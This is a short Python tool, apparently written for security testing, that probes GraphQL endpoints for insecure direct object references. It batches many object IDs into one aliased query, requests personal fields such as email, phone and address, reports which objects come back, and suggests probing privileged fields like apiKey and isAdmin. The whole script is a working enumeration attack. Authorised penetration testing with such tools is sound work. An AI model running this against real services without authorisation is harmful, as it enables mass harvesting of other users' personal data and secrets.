#!/usr/bin/env python3
"""gql_idor_aliasing.py — GraphQL IDOR probes via direct object queries and alias enumeration.

Generates alias-batched object queries (N user IDs in one request) and field-level
privilege probes against a GraphQL endpoint, so ownership checks can be tested at
scale. Run authenticated with --header.

Usage:
  python3 gql_idor_aliasing.py --endpoint https://target.com/graphql --field user
  python3 gql_idor_aliasing.py --endpoint ... --field order --start-id 100 --count 50
  python3 gql_idor_aliasing.py --endpoint ... --header "Cookie: session=USER_A"
  python3 gql_idor_aliasing.py --help
"""

import argparse
import json
import subprocess
import sys


def _post(endpoint: str, headers: list, payload: str) -> str:
    curl_args = ["curl", "-s", "--max-time", "45", "-X", "POST", endpoint,
                 "-H", "Content-Type: application/json", "-d", payload]
    for h in headers:
        curl_args += ["-H", h]
    try:
        r = subprocess.run(curl_args, capture_output=True, text=True, timeout=50)
        return r.stdout
    except subprocess.TimeoutExpired:
        return ""


def main() -> int:
    ap = argparse.ArgumentParser(description="Probe GraphQL direct-object IDOR via aliases.")
    ap.add_argument("--endpoint", required=True, help="GraphQL endpoint URL")
    ap.add_argument("--field", required=True, help="Object query field, e.g. user, order, invoice")
    ap.add_argument("--fields", default="id email phone address",
                    help="Fields to request on the object (default: id email phone address)")
    ap.add_argument("--start-id", type=int, default=1, help="First ID to enumerate (default 1)")
    ap.add_argument("--count", type=int, default=20, help="Number of IDs per request (default 20)")
    ap.add_argument("--header", action="append", default=[], help="Extra HTTP header (repeatable)")
    args = ap.parse_args()

    ids = range(args.start_id, args.start_id + args.count)
    aliases = " ".join(f"q{i}: {args.field}(id: {i}) {{ {args.fields} }}" for i in ids)
    payload = json.dumps({"query": "{ " + aliases + " }"})

    print(f"[*] Querying {args.field} ids {args.start_id}..{args.start_id + args.count - 1} in one request")
    out = _post(args.endpoint, args.header, payload)

    hits = 0
    for i in ids:
        marker = f'"q{i}"'
        if marker in out:
            hits += 1
            print(f"[+] q{i}: object returned — data accessible by ID")
    if hits == 0:
        print("[-]  No aliased objects returned (endpoint may reject unknown ids, block aliases, or enforce auth)")
        print("[*]  If the response is an error list, check for field-level errors vs data leakage.")

    print("\nNext steps:")
    print("  1. Compare two sessions: run with session A, read object of user B.")
    print("  2. If only your own IDs return — no IDOR, move on.")
    print("  3. Also probe privileged fields: role, isAdmin, internalNote, apiKey.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
